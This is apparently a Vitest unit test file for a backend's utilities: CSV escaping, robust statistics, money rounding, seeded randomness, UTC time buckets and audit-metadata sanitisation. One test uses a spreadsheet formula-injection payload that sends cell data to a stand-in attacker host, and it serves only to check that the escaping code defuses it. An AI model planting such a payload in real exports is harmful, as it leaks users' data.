import { describe, expect, it } from 'vitest';
import { buildCsv, escapeCsvCell, isFormulaLike } from '../../src/utils/csv.js';
import {
  median,
  medianAbsoluteDeviation,
  ramp,
  robustZScore,
  thresholdFraction,
} from '../../src/utils/stats.js';
import {
  roundToCents,
  sumAmounts,
  toAmountNumber,
  toDecimalString,
} from '../../src/utils/money.js';
import { createRng } from '../../src/utils/random.js';
import {
  enumerateBuckets,
  resolveRange,
  startOfUtcDay,
  startOfUtcWeek,
} from '../../src/utils/time.js';
import { sanitizeMetadata } from '../../src/modules/audit/audit.metadata.js';

describe('CSV formula-injection protection', () => {
  it('recognises every character a spreadsheet treats as a formula start', () => {
    for (const value of ['=1+1', '+1', '-1', '@foo', '\tx', '\rx']) {
      expect(isFormulaLike(value)).toBe(true);
    }
    expect(isFormulaLike('safe')).toBe(false);
    expect(isFormulaLike('')).toBe(false);
  });

  it('neutralises a formula with a leading apostrophe', () => {
    expect(escapeCsvCell('=1+1')).toBe("'=1+1");
    expect(escapeCsvCell('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralises a hyperlink exfiltration payload', () => {
    const payload = '=HYPERLINK("http://attacker.example/?d="&A1,"Click")';
    const escaped = escapeCsvCell(payload);
    // Quoted because it contains commas and quotes, and prefixed so it is text.
    expect(escaped.startsWith('"\'=')).toBe(true);
    expect(escaped).not.toMatch(/^=/);
  });

  it('quotes and doubles embedded quotes', () => {
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCsvCell('a,b')).toBe('"a,b"');
    expect(escapeCsvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('strips control characters that would corrupt the file', () => {
    expect(escapeCsvCell('a\u0000b\u0007c')).toBe('abc');
  });

  it('renders null and undefined as empty cells', () => {
    expect(escapeCsvCell(null)).toBe('');
    expect(escapeCsvCell(undefined)).toBe('');
  });

  it('builds a document with a header row and CRLF endings', () => {
    const csv = buildCsv(
      [
        { key: 'a', header: 'col_a' },
        { key: 'b', header: 'col_b' },
      ],
      [{ a: 1, b: '=2' }],
    );
    expect(csv).toBe("col_a,col_b\r\n1,'=2\r\n");
  });
});

describe('statistics', () => {
  it('computes a median for odd and even lengths', () => {
    expect(median([3, 1, 2])).toBe(2);
    expect(median([4, 1, 2, 3])).toBe(2.5);
    expect(median([])).toBeNull();
  });

  it('uses a robust spread that a single outlier cannot inflate', () => {
    const settled = Array.from({ length: 20 }, () => 1000);
    const withOutlier = [...settled, 10_000_000];
    const mad = medianAbsoluteDeviation(withOutlier);
    // One enormous payment barely moves the MAD, which is the whole point of
    // using it rather than a standard deviation.
    expect(mad).toBeLessThan(100);
  });

  it('returns a finite z-score when every historical value is identical', () => {
    const history = Array.from({ length: 10 }, () => 1000);
    const score = robustZScore(5000, history);
    expect(Number.isFinite(score)).toBe(true);
    expect(score).toBeGreaterThan(0);
  });

  it('clamps a ramp outside its interval', () => {
    expect(ramp(0, 10, 20)).toBe(0);
    expect(ramp(10, 10, 20)).toBe(0);
    expect(ramp(15, 10, 20)).toBe(0.5);
    expect(ramp(99, 10, 20)).toBe(1);
  });

  it('gives a threshold-shaped fraction the configured floor at the threshold', () => {
    expect(thresholdFraction(10, 10, 20)).toBe(0.5);
    expect(thresholdFraction(15, 10, 20)).toBe(0.75);
    expect(thresholdFraction(20, 10, 20)).toBe(1);
    expect(thresholdFraction(5, 10, 20)).toBe(0.5);
  });
});

describe('money', () => {
  it('rounds to two decimal places without float drift', () => {
    expect(roundToCents(1.005)).toBe(1.01);
    expect(roundToCents(0.1 + 0.2)).toBe(0.3);
  });

  it('formats a fixed-point string for a NUMERIC(14,2) column', () => {
    expect(toDecimalString(1234.5)).toBe('1234.50');
    expect(toDecimalString(0.1 + 0.2)).toBe('0.30');
  });

  it('sums exactly, in cents', () => {
    const values = Array.from({ length: 10 }, () => 0.1);
    expect(sumAmounts(values)).toBe(1);
  });

  it('accepts a Decimal-like object that stringifies exactly', () => {
    expect(toAmountNumber({ toString: () => '1234.56' })).toBe(1234.56);
    expect(toAmountNumber(null)).toBeNull();
  });
});

describe('deterministic RNG', () => {
  it('produces the same stream for the same seed', () => {
    const a = createRng(42);
    const b = createRng(42);
    const first = Array.from({ length: 20 }, () => a.next());
    const second = Array.from({ length: 20 }, () => b.next());
    expect(second).toEqual(first);
  });

  it('produces a different stream for a different seed', () => {
    const a = Array.from({ length: 10 }, createRng(1).next);
    const b = Array.from({ length: 10 }, createRng(2).next);
    expect(b).not.toEqual(a);
  });

  it('stays within bounds', () => {
    const rng = createRng(7);
    for (let i = 0; i < 500; i += 1) {
      const value = rng.int(5, 10);
      expect(value).toBeGreaterThanOrEqual(5);
      expect(value).toBeLessThanOrEqual(10);
      expect(rng.next()).toBeLessThan(1);
    }
  });

  it('honours relative weights, ignoring zero-weighted keys', () => {
    const rng = createRng(3);
    const counts = { a: 0, b: 0, c: 0 };
    for (let i = 0; i < 3000; i += 1) {
      counts[rng.weighted({ a: 90, b: 10, c: 0 })] += 1;
    }
    expect(counts.c).toBe(0);
    expect(counts.a).toBeGreaterThan(counts.b * 4);
  });
});

describe('time windows', () => {
  it('truncates to the UTC day regardless of host timezone', () => {
    const start = startOfUtcDay(new Date('2026-06-15T23:30:00Z'));
    expect(start.toISOString()).toBe('2026-06-15T00:00:00.000Z');
  });

  it('starts an ISO week on Monday', () => {
    // 2026-06-15 is a Monday; 2026-06-21 is the following Sunday.
    expect(startOfUtcWeek(new Date('2026-06-21T12:00:00Z')).toISOString()).toBe(
      '2026-06-15T00:00:00.000Z',
    );
  });

  it('defaults an open range to the last N days', () => {
    const { from, to } = resolveRange({}, { defaultDays: 7 });
    expect(to.getTime() - from.getTime()).toBeCloseTo(7 * 86_400_000, -4);
  });

  it('emits a bucket for every period, including empty ones', () => {
    const buckets = enumerateBuckets(
      new Date('2026-06-01T00:00:00Z'),
      new Date('2026-06-05T00:00:00Z'),
      'day',
    );
    expect(buckets).toHaveLength(5);
  });

  it('caps bucket generation so a wide hourly range cannot exhaust memory', () => {
    const buckets = enumerateBuckets(
      new Date('2020-01-01T00:00:00Z'),
      new Date('2026-01-01T00:00:00Z'),
      'hour',
    );
    expect(buckets.length).toBeLessThanOrEqual(2000);
  });
});

describe('audit metadata sanitisation', () => {
  it('drops any key that is not explicitly allow-listed', () => {
    const result = sanitizeMetadata({
      email: 'a@b.com',
      password: 'hunter2',
      passwordHash: '$2b$12$abc',
      token: 'secret-token',
      authorization: 'Bearer x',
      creditCard: '4111111111111111',
    });
    expect(result).toEqual({ email: 'a@b.com' });
    expect(JSON.stringify(result)).not.toContain('hunter2');
    expect(JSON.stringify(result)).not.toContain('secret-token');
  });

  it('truncates long strings rather than storing them whole', () => {
    const result = sanitizeMetadata({ reason: 'x'.repeat(5000) });
    expect(result.reason.length).toBe(500);
  });

  it('flattens to a single level of nesting', () => {
    const result = sanitizeMetadata({
      previousThresholds: { mediumThreshold: 30, nested: { deep: 'dropped' } },
    });
    expect(result.previousThresholds).toEqual({ mediumThreshold: 30 });
  });

  it('returns null when nothing survives the allow-list', () => {
    expect(sanitizeMetadata({ password: 'x' })).toBeNull();
    expect(sanitizeMetadata(null)).toBeNull();
  });
});
